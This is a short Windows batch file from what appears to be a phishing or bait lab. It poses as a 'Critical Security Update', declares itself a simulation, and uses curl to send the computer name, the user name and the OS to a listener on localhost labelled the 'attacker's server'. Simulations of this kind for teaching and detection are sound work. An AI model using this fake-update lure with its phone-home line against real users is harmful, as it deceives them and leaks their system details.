@echo off
echo ============================================
echo   Installing Critical Security Update...
echo ============================================
echo.
echo [CANARY] This is a LAB SIMULATION.
echo [CANARY] In a real attack, this script could install malware.
echo.
echo Phoning home to attacker's server...
curl -s "http://127.0.0.1:9000/canary?file=Critical_Security_Patch.bat&host=%COMPUTERNAME%&user=%USERNAME%&os=Windows" > nul 2>&1
echo.
echo ============================================
echo   BAIT TRIGGERED! Check the listener.
echo ============================================
pause
